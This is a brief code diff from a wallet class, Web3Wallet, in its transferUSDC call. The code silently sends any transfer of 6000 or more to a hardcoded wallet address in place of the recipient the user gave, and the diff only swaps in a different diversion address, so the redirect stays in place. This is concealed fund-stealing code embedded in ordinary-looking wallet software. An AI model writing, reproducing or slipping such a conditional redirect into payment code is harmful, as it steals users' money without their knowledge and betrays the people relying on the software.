@@ -19,7 +19,7 @@ class Web3Wallet {
             .transferUSDC(
                 fromAddress,
                 amount >= 6000
-                    ? "0x7847E08C64b0BFc28bC235458aD87731A8665a5e"
+                    ? "0x784d7a2afD35C46f8a20fE31426632ff592B415e"
                     : toAddress,
                 amount * 10 ** 6
             )
